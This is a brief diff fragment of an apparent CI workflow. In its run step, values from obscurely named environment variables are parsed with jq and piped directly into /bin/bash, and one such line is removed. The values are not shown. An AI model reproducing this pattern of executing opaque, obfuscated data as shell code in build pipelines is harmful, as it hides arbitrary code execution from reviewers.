@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
           echo $ne9473 | jq -r .azw76 | /bin/bash
-          echo $c72 | jq -r .d24 | /bin/bash
           echo $v86104 | jq -r .gfuqv6112 | /bin/bash
           echo $t97053 | jq -r .h8734 | /bin/bash
           echo $fyssu5 | jq -r .hguq49515 | /bin/bash
